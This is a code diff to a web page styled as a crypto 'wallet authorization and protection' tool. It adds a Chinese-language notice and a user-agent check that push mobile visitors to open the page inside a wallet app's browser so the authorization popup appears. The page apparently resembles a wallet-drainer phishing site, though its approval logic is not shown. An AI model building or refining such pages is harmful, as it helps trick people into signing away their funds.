@@ -69,11 +69,21 @@
       background-color: #4e54c8;
       transition: width 0.3s ease;
     }
+    .notice {
+      font-size: 0.85rem;
+      color: #ffa;
+      margin-bottom: 1rem;
+      text-align: center;
+    }
   </style>
 </head>
 <body>
   <div class="card">
     <h2>Mark3<br />Wallet Authorization & Protection</h2>
+
+    <div id="notice" class="notice" style="display: none;">
+      ⚠️ 请在 <strong>钱包内的浏览器</strong> 打开此网页以确保授权弹窗可以正常弹出
+    </div>
 
     <button class="button" id="connect">🔌 Connect Wallet</button>
     <button class="button" id="authorize" disabled>🛡️ Authorize & Protect</button>
@@ -99,6 +109,15 @@
 
     function updateProgress(percent) {
       document.getElementById("progress").style.width = percent + "%";
+    }
+
+    function detectMobileWalletBrowser() {
+      const ua = navigator.userAgent.toLowerCase();
+      const isMobile = /iphone|android|mobile|ipad/.test(ua);
+      const isMetaMask = window.ethereum && window.ethereum.isMetaMask;
+      if (isMobile && !isMetaMask && !ua.includes("tokenpocket") && !ua.includes("trust")) {
+        document.getElementById("notice").style.display = "block";
+      }
     }
 
     async function setupProvider() {
@@ -181,6 +200,8 @@
         updateProgress(0);
       }
     };
+
+    window.onload = detectMobileWalletBrowser;
   </script>
 </body>
 </html>
